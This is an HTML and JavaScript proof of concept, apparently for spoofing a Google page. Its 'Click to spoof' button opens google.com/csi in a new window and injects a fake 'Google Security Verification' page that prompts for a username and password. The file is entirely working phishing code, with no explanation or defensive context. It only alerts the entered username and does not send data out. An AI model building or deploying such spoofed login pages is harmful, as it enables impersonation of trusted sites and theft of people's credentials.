<!DOCTYPE html>
<html>
  <body>
    <button id="Btn1">Click to spoof</button>

    <script>
      function spoof() {
        // Ubah tombol menjadi input text
        const button = document.getElementById("Btn1");
        button.outerHTML = `
          <div>
            <input type="text" id="textInput" placeholder="Enter text here" 
                   style="padding: 10px; font-size: 16px; border: 2px solid #4285f4; border-radius: 4px;">
            <button onclick="revertToButton()" 
                    style="margin-left: 10px; padding: 10px; background-color: #f44336; color: white; border: none; border-radius: 4px;">
              Cancel
            </button>
          </div>
        `;
        
        // Fokus ke input setelah dibuat
        setTimeout(() => {
          const input = document.getElementById("textInput");
          if (input) input.focus();
        }, 10);

        // Lanjutkan dengan fungsi spoof asli
        let win = window.open("https://www.google.com/csi", "_blank");
        
        if (!win) {
          alert("Continue..");
          return;
        }

        setTimeout(() => {
          try {
            win.stop();
            win.document.write(`
              <!DOCTYPE html>
              <html>
              <head>
                <title>Google - Security Check</title>
              </head>
              <body>
                <h1 style="color: #4285f4; font-family: Arial, sans-serif;">Google Security Verification</h1>
                <p>Please verify your identity to continue.</p>
                <button onclick="
                  let username = prompt('Enter your username');
                  let password = prompt('Enter your password');
                  if(username && password) {
                    alert('Verification successful!\\nUsername: ' + username);
                  }
                " style="
                  background-color: #4285f4;
                  color: white;
                  border: none;
                  padding: 10px 20px;
                  border-radius: 4px;
                  cursor: pointer;
                  font-size: 16px;
                ">Verify Account</button>
              </body>
              </html>
            `);
            win.document.close();
          } catch (e) {
            console.warn("Blocked by browser protections:", e);
            if (win && !win.closed) {
              win.close();
            }
          }
        }, 100);
      }

      // Fungsi untuk mengembalikan ke tombol
      function revertToButton() {
        const container = document.querySelector('body > div');
        if (container) {
          container.outerHTML = '<button id="Btn1">Click to spoof</button>';
          // Pasang kembali event listener
          const newButton = document.getElementById("Btn1");
          newButton.addEventListener("click", spoof);
        }
      }

      // Pasang event listener ke tombol
      document.getElementById("Btn1").addEventListener("click", spoof);
    </script>
  </body>
</html>
